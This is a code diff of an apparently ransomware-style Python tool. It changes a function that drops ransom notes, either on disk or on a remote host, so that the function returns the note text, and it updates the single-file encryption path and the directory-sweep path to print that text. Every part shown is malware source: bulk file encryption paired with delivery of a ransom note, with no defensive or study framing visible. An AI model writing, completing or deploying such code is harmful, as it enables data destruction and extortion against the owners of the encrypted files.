@@ -314,14 +314,14 @@ def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str
             sink_obj = _RemoteSink(host, port, timeout, sink_path)
             sink_obj.write(note_text.encode("utf-8"))
         except OSError:
-            return f"note drop failed on {host}: {sink_path}"
+            return (f"note drop failed on {host}: {sink_path}", "")
         finally:
             if sink_obj is not None:
                 try:
                     sink_obj.close()
                 except Exception:
                     pass
-        return f"{host}:{sink_path}"
+        return (f"{host}:{sink_path}", note_text)
     else:
         local_note = Path(base_path)
         if local_note.is_file():
@@ -330,8 +330,8 @@ def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str
         try:
             note_path.write_text(note_text, encoding="utf-8")
         except OSError as exc:
-            return f"note drop failed: {exc}"
-        return str(note_path)
+            return (f"note drop failed: {exc}", "")
+        return (str(note_path), note_text)
 
 
 def _default_output(file_path: str) -> str:
@@ -436,10 +436,10 @@ class Cipher(BaseCipher):
             return CipherResult(stream_error, False)
         destination = getattr(args, "output", None) or _default_output(file_path or "")
         if getattr(args, "drop_note", None):
-            drop_loc = _drop_ransom_note(args, file_path if file_path else None,
-                                         host, port, timeout, local_out)
+            drop_loc, drop_note_text = _drop_ransom_note(args, file_path if file_path else None,
+                                                          host, port, timeout, local_out)
             return CipherResult(
-                f"File encrypted to {destination}\n[+] ransom note dropped -> {drop_loc}",
+                f"File encrypted to {destination}\n[+] ransom note dropped -> {drop_loc}\n{drop_note_text}",
                 True,
             )
         return CipherResult(f"File encrypted to {destination}", True)
@@ -621,8 +621,9 @@ class Cipher(BaseCipher):
             return CipherResult(f"No files found in {file_path}", False)
 
         drop_loc = None
+        drop_note_text = ""
         if getattr(args, "drop_note", None):
-            drop_loc = _drop_ransom_note(args, file_path, host, port, timeout, local_out)
+            drop_loc, drop_note_text = _drop_ransom_note(args, file_path, host, port, timeout, local_out)
 
         results: list[str] = []
         for i, target_file in enumerate(files, start=1):
@@ -641,7 +642,7 @@ class Cipher(BaseCipher):
         header = f"Directory sweep: {file_path} ({len(files)} files; {ok} encrypted)"
         summary = header + "\n" + "\n".join(results)
         if drop_loc is not None:
-            summary += f"\n[+] ransom note dropped -> {drop_loc}"
+            summary += f"\n[+] ransom note dropped -> {drop_loc}\n{drop_note_text}"
         return CipherResult(summary, ok > 0)
 
 
